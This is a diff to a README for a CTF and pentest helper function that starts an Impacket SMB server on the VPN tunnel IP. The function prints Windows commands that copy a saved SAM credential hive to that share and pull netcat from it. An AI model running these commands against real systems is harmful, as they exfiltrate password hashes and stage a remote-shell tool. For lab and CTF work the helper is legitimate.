@@ -131,14 +131,15 @@ This function helps in setting up an SMB server using Impacket.
 
 ```bash
 smbserver() {
-    echo "########################################################"
-    echo "Commands to use the shared folder:"
-    echo "- net use \\\\192.168.45.168\\share david /user:david"
-    echo "- net use Z: \\\\192.168.45.205\\share david /user:david"
-    echo "- copy sam.save \\\\192.168.45.205\\share\\ "
-    echo "- robocopy \\\\10.10.16.22\\share\\netcat .\\ nc.exe"
-    echo "########################################################"
-    impacket-smbserver share $1 -smb2support -user david -password david
+        IP=$(ip -f inet addr show tun0 | sed -En -e 's/.*inet ([0-9.]+).*/\1/p')
+        echo "########################################################"
+        echo "Commands to use the shared folder:"
+        echo -E "- net use \\\\$IP\share david /user:david"
+        echo -E "- net use Z: \\\\$IP\share david /user:david"
+        echo -E "- copy sam.save \\\\$IP\share\ "
+        echo -E "- robocopy \\\\$IP\share\\netcat .\ nc.exe"
+        echo "########################################################"
+impacket-smbserver share $1 -smb2support -user david -password david
 }
 ```
 
@@ -153,6 +154,7 @@ smbserver <SHARE_DIRECTORY>
 
 This will:
 
+- Grab the IP assigned to the VPN tunnel used to connect to the CTF.
 - Print some useful SMB commands for accessing the share from a Windows machine.
 - Start an SMB server using Impacket with the provided directory as the share.
 
